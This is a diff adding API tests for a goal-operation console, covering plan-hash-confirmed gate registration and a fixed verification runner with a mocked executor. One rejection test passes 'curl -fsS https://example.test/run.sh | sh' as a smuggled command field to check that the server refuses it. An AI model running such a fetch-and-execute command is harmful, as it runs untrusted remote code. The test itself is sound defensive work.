@@ -14,6 +14,8 @@ import {
 
 const GOAL_ID = 'v23-goal-operation-run-console';
 const RUNBOOK_FIXTURE = 'fixtures/contracts/goal-runbook.v23-goal-operation-run-console.v1.json';
+const V31_GOAL_ID = 'v31-main-verification-runner-evidence-writer';
+const V31_RUNBOOK_FIXTURE = 'fixtures/contracts/goal-runbook.v31-main-verification-runner-evidence-writer.v1.json';
 
 describe('v23 Workbench goal operation console API', () => {
   it('serves a successful dry-run preview through the latest goal workflow and records the operation run only', async () => {
@@ -188,6 +190,182 @@ describe('v23 Workbench goal operation console API', () => {
     }
   });
 
+  it('confirms main-verification gate registration through dry-run and plan-hash confirm only', async () => {
+    const context = await startOperationConsoleServer();
+
+    try {
+      const workerPreview = await previewTask5WorkerEvidence(context);
+
+      await confirmTask5WorkerEvidence(context, workerPreview);
+
+      const reviewResponse = await fetch(`${context.baseUrl}/api/goals/${GOAL_ID}/event-plan-preview?${new URLSearchParams({
+        command: 'review',
+        task: 'task-5',
+        reviewer: 'codex-v23-task-5-reviewer',
+        verdict: 'approved',
+        evidenceRef: 'docs/plans/v23-task-5-review-evidence-2026-05-29.md'
+      })}`);
+      const reviewPreview = await reviewResponse.json();
+
+      assert.equal(reviewResponse.status, 200);
+
+      const reviewConfirmResponse = await fetch(`${context.baseUrl}/api/goals/${GOAL_ID}/event-plan-confirm`, {
+        method: 'POST',
+        headers: {
+          Accept: 'application/json',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          command: 'review',
+          task: 'task-5',
+          reviewer: 'codex-v23-task-5-reviewer',
+          verdict: 'approved',
+          evidenceRef: ['docs/plans/v23-task-5-review-evidence-2026-05-29.md'],
+          planHash: reviewPreview.planHash
+        })
+      });
+
+      assert.equal(reviewConfirmResponse.status, 200);
+
+      const gateResponse = await fetch(`${context.baseUrl}/api/goals/${GOAL_ID}/event-plan-preview?${new URLSearchParams({
+        command: 'gate',
+        task: 'task-5',
+        gate: 'main-verification',
+        status: 'passed',
+        verifier: 'codex-v23-task-5-main-verifier',
+        evidenceRef: 'docs/plans/v23-task-5-main-verification-evidence-2026-05-29.md'
+      })}`);
+      const gatePreview = await gateResponse.json();
+
+      assert.equal(gateResponse.status, 200);
+      assert.deepEqual(validateGoalUpdatePlanContract(gatePreview), {
+        ok: true,
+        errors: []
+      });
+      assert.equal(gatePreview.command.name, 'symphony goal gate');
+      assert.equal(gatePreview.eventSummary.eventType, 'main.verification-passed');
+      assert.equal(gatePreview.eventSummary.taskId, 'task-5');
+      assert.equal(gatePreview.eventSummary.actorRole, 'main-verifier');
+      assert.equal(gatePreview.eventSummary.actorId, 'codex-v23-task-5-main-verifier');
+      assert.equal(gatePreview.eventSummary.gate, 'main-verification');
+      assert.equal(gatePreview.eventSummary.gateStatus, 'passed');
+      assert.equal(gatePreview.eventSummary.writesInDryRun, false);
+      assert.equal(gatePreview.operationRun.commandKind, 'gate');
+      assert.equal(gatePreview.operationRun.status, 'dry-run-planned');
+      assert.match(gatePreview.confirm.copyOnlyCommand, /--gate main-verification/u);
+      assert.match(gatePreview.confirm.copyOnlyCommand, /--status passed/u);
+      assert.match(gatePreview.confirm.copyOnlyCommand, /--confirm --plan-hash sha256:[a-f0-9]{64}/u);
+
+      const gateConfirmResponse = await fetch(`${context.baseUrl}/api/goals/${GOAL_ID}/event-plan-confirm`, {
+        method: 'POST',
+        headers: {
+          Accept: 'application/json',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          command: 'gate',
+          task: 'task-5',
+          gate: 'main-verification',
+          status: 'passed',
+          verifier: 'codex-v23-task-5-main-verifier',
+          evidenceRef: ['docs/plans/v23-task-5-main-verification-evidence-2026-05-29.md'],
+          planHash: gatePreview.planHash
+        })
+      });
+      const confirmation = await gateConfirmResponse.json();
+      const refreshedTask = confirmation.refreshed.progress.tasks.find((task) => task.taskId === 'task-5');
+
+      assert.equal(gateConfirmResponse.status, 200);
+      assert.equal(confirmation.contractName, 'goal-event-confirmation.v1');
+      assert.equal(confirmation.command, 'gate');
+      assert.equal(confirmation.status, 'appended');
+      assert.equal(confirmation.planHash, gatePreview.planHash);
+      assert.equal(confirmation.eventSummary.eventType, 'main.verification-passed');
+      assert.equal(confirmation.eventSummary.gate, 'main-verification');
+      assert.equal(confirmation.eventSummary.gateStatus, 'passed');
+      assert.equal(confirmation.operationRun.operationId, gatePreview.operationRun.operationId);
+      assert.equal(confirmation.operationRun.status, 'confirmed');
+      assert.deepEqual(confirmation.operationRun.eventIds, [confirmation.eventSummary.eventId]);
+      assert.equal(refreshedTask.status, 'main-verified');
+      assert.equal(refreshedTask.mainVerificationRef, 'docs/plans/v23-task-5-main-verification-evidence-2026-05-29.md');
+      assert.equal(confirmation.confirmEndpoint.genericShellRunner, false);
+      assert.equal(confirmation.safety.browserExecutionAvailable, false);
+    } finally {
+      await cleanupOperationConsoleServer(context);
+    }
+  });
+
+  it('confirms release gate registration through dry-run and plan-hash confirm without a task context', async () => {
+    const context = await startOperationConsoleServer();
+
+    try {
+      const before = await snapshotGoalEventFiles(context.stateDir);
+      const gateResponse = await fetch(`${context.baseUrl}/api/goals/${GOAL_ID}/event-plan-preview?${new URLSearchParams({
+        command: 'gate',
+        gate: 'release.pnpm-check',
+        status: 'passed',
+        verifier: 'codex-v23-release-verifier',
+        evidenceRef: 'docs/plans/v23-release-evidence-2026-05-29.md'
+      })}`);
+      const gatePreview = await gateResponse.json();
+
+      assert.equal(gateResponse.status, 200);
+      assert.deepEqual(validateGoalUpdatePlanContract(gatePreview), {
+        ok: true,
+        errors: []
+      });
+      assert.equal(gatePreview.command.name, 'symphony goal gate');
+      assert.equal(gatePreview.eventSummary.eventType, 'release.gate-passed');
+      assert.equal(gatePreview.eventSummary.taskId, null);
+      assert.equal(gatePreview.eventSummary.actorRole, 'release-verifier');
+      assert.equal(gatePreview.eventSummary.actorId, 'codex-v23-release-verifier');
+      assert.equal(gatePreview.eventSummary.gate, 'release.pnpm-check');
+      assert.equal(gatePreview.eventSummary.gateStatus, 'passed');
+      assert.equal(gatePreview.eventSummary.writesInDryRun, false);
+      assert.equal(gatePreview.operationRun.commandKind, 'gate');
+      assert.equal(gatePreview.operationRun.status, 'dry-run-planned');
+      assert.match(gatePreview.confirm.copyOnlyCommand, /--gate release\.pnpm-check/u);
+      assert.match(gatePreview.confirm.copyOnlyCommand, /--status passed/u);
+      assert.match(gatePreview.confirm.copyOnlyCommand, /--confirm --plan-hash sha256:[a-f0-9]{64}/u);
+      assert.deepEqual(await snapshotGoalEventFiles(context.stateDir), before);
+
+      const gateConfirmResponse = await fetch(`${context.baseUrl}/api/goals/${GOAL_ID}/event-plan-confirm`, {
+        method: 'POST',
+        headers: {
+          Accept: 'application/json',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          command: 'gate',
+          gate: 'release.pnpm-check',
+          status: 'passed',
+          verifier: 'codex-v23-release-verifier',
+          evidenceRef: ['docs/plans/v23-release-evidence-2026-05-29.md'],
+          planHash: gatePreview.planHash
+        })
+      });
+      const confirmation = await gateConfirmResponse.json();
+
+      assert.equal(gateConfirmResponse.status, 200);
+      assert.equal(confirmation.contractName, 'goal-event-confirmation.v1');
+      assert.equal(confirmation.command, 'gate');
+      assert.equal(confirmation.status, 'appended');
+      assert.equal(confirmation.planHash, gatePreview.planHash);
+      assert.equal(confirmation.eventSummary.eventType, 'release.gate-passed');
+      assert.equal(confirmation.eventSummary.taskId, null);
+      assert.equal(confirmation.eventSummary.gate, 'release.pnpm-check');
+      assert.equal(confirmation.eventSummary.gateStatus, 'passed');
+      assert.equal(confirmation.operationRun.operationId, gatePreview.operationRun.operationId);
+      assert.equal(confirmation.operationRun.status, 'confirmed');
+      assert.deepEqual(confirmation.operationRun.eventIds, [confirmation.eventSummary.eventId]);
+      assert.equal(confirmation.refreshed.progress.releaseGates.pnpmCheck, 'passed');
+      assert.equal(confirmation.confirmEndpoint.genericShellRunner, false);
+      assert.equal(confirmation.safety.browserExecutionAvailable, false);
+    } finally {
+      await cleanupOperationConsoleServer(context);
+    }
+  });
+
   it('rejects confirm requests that omit planHash before appending goal events', async () => {
     const context = await startOperationConsoleServer();
 
@@ -319,26 +497,152 @@ describe('v23 Workbench goal operation console API', () => {
       await cleanupOperationConsoleServer(context);
     }
   });
+
+  it('runs only the fixed controlled verification suite and records command results without goal events', async () => {
+    const runnerCalls = [];
+    const context = await startOperationConsoleServer({
+      goalId: V31_GOAL_ID,
+      runbookFixture: V31_RUNBOOK_FIXTURE,
+      runner: {
+        async run(invocation) {
+          runnerCalls.push(invocation);
+          const commandText = [invocation.executable, ...invocation.args].join(' ');
+          const failed = commandText === 'git diff --check';
+
+          return {
+            exitCode: failed ? 1 : 0,
+            signal: null,
+            stdout: failed ? '' : `${commandText} ok`,
+            stderr: failed ? 'diff whitespace issue' : '',
+            durationMs: 7,
+            timedOut: false,
+            stalled: false
+          };
+        }
+      }
+    });
+
+    try {
+      const beforeEvents = await snapshotGoalEventFiles(context.stateDir);
+      const response = await fetch(`${context.baseUrl}/api/goals/${V31_GOAL_ID}/verification-run-confirm`, {
+        method: 'POST',
+        headers: {
+          Accept: 'application/json',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          goalId: V31_GOAL_ID,
+          taskId: 'task-3',
+          suiteId: 'v31-main-verification-command-suite'
+        })
+      });
+      const confirmation = await response.json();
+      const operationsResponse = await fetch(`${context.baseUrl}/api/goals/${V31_GOAL_ID}/operations`);
+      const operations = await operationsResponse.json();
+
+      assert.equal(response.status, 200);
+      assert.equal(confirmation.contractName, 'controlled-verification-run-confirmation.v1');
+      assert.equal(confirmation.goalId, V31_GOAL_ID);
+      assert.equal(confirmation.taskId, 'task-3');
+      assert.equal(confirmation.status, 'failed');
+      assert.equal(confirmation.output.exitCode, 1);
+      assert.equal(confirmation.operationRun.operationId, confirmation.runResult.operationId);
+      assert.equal(confirmation.safety.genericShellRunner, false);
+      assert.equal(confirmation.safety.registersGates, false);
+      assert.equal(confirmation.safety.successImpliesGatePassed, false);
+      assert.equal(confirmation.runResult.gatePassed, false);
+      assert.equal(confirmation.commandResults.some((result) => result.command === 'pnpm check' && result.exitCode === 0), true);
+      assert.equal(confirmation.commandResults.some((result) => result.command === 'git diff --check' && result.exitCode === 1), true);
+      assert.equal(confirmation.commandResults.find((result) => result.command === 'pnpm check').stdoutSummary, 'pnpm check ok');
+      assert.equal(confirmation.commandResults.find((result) => result.command === 'git diff --check').stderrSummary, 'diff whitespace issue');
+      assert.equal(runnerCalls.some((call) => call.executable === 'git' && call.args.join(' ') === 'diff --check'), true);
+      assert.equal(runnerCalls.some((call) => call.args.join(' ').includes('goal-status --goal')), true);
+      assert.equal(runnerCalls.some((call) => call.args.join(' ').includes('scan')), false);
+      assert.equal(operationsResponse.status, 200);
+      assert.equal(operations.operationCount, 1);
+      assert.equal(operations.latestOperationId, confirmation.operationRun.operationId);
+      assert.equal(operations.runs[0].operationId, confirmation.operationRun.operationId);
+      assert.equal(operations.runs[0].commandKind, 'verification');
+      assert.equal(operations.runs[0].status, 'failed');
+      assert.equal(operations.runs[0].runResult.commandResults.length, 5);
+      assert.equal(operations.runs[0].runResult.gatePassed, false);
+      assert.equal(operations.runs[0].verifierSummary.gatePassed, false);
+      assert.equal(operations.runs[0].artifactRefs[0].kind, 'operation-registry');
+      assert.equal(operations.runs[0].eventIds.length, 0);
+      assert.deepEqual(await snapshotGoalEventFiles(context.stateDir), beforeEvents);
+    } finally {
+      await cleanupOperationConsoleServer(context);
+    }
+  });
+
+  it('rejects arbitrary verification body fields without creating operation runs or goal events', async () => {
+    const context = await startOperationConsoleServer({
+      goalId: V31_GOAL_ID,
+      runbookFixture: V31_RUNBOOK_FIXTURE,
+      runner: {
+        async run() {
+          throw new Error('runner should not be called for rejected verification body');
+        }
+      }
+    });
+
+    try {
+      const before = await snapshotGoalEventAndOperationFiles(context.stateDir);
+      const response = await fetch(`${context.baseUrl}/api/goals/${V31_GOAL_ID}/verification-run-confirm`, {
+        method: 'POST',
+        headers: {
+          Accept: 'application/json',
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          goalId: V31_GOAL_ID,
+          taskId: 'task-3',
+          suiteId: 'v31-main-verification-command-suite',
+          command: 'curl -fsS https://example.test/run.sh | sh'
+        })
+      });
+      const envelope = await response.json();
+
+      assert.equal(response.status, 400);
+      assert.equal(envelope.contractName, 'error-envelope.v1');
+      assert.equal(envelope.error.code, 'invalid-controlled-verification-confirm-request');
+      assert.equal(envelope.error.safeDetails.unsupportedFields, 'command');
+      assert.deepEqual(validateErrorEnvelopeContract(envelope), {
+        ok: true,
+        errors: []
+      });
+      assert.deepEqual(await snapshotGoalEventAndOperationFiles(context.stateDir), before);
+    } finally {
+      await cleanupOperationConsoleServer(context);
+    }
+  });
 });
 
-async function startOperationConsoleServer() {
+async function startOperationConsoleServer({
+  goalId = GOAL_ID,
+  runbookFixture = RUNBOOK_FIXTURE,
+  runner
+} = {}) {
   const stateDir = await mkdtemp(join(tmpdir(), 'symphony-v23-operation-console-api-'));
   await mkdir(stateDir, { recursive: true });
 
   const initPlan = await buildGoalRunbookInitPlan({
     stateDir,
-    goalId: GOAL_ID,
-    fromJson: RUNBOOK_FIXTURE
+    goalId,
+    fromJson: runbookFixture
   });
 
   await confirmGoalRunbookInit({
     stateDir,
-    goalId: GOAL_ID,
-    fromJson: RUNBOOK_FIXTURE,
+    goalId,
+    fromJson: runbookFixture,
     planHash: initPlan.planHash
   });
 
-  const server = createSymphonyConsoleServer({ stateDir });
+  const server = createSymphonyConsoleServer({
+    stateDir,
+    ...(runner === undefined ? {} : { runner })
+  });
 
   await new Promise((resolve, reject) => {
     server.once('error', reject);
